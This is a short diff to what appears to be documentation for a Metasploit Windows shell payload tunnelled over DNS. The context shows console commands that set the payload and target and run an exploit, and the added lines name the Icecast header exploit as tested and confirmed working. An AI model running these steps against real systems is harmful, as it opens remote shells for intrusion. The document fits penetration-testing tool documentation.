@@ -30,6 +30,8 @@ set payload windows/shell/dns_tunnel
 set RHOST <IP address> 
 exploit
 
+Most of the tests were done using the icecast exploit (exploit/windows/http/icecast_header) and this is confirmed to work.
+Might not fit in all other exploits.
 
 Example of output that you should see if exploitation works and your DNS tunnel is up and running: http://pastebin.com/1PQD6f1D
 
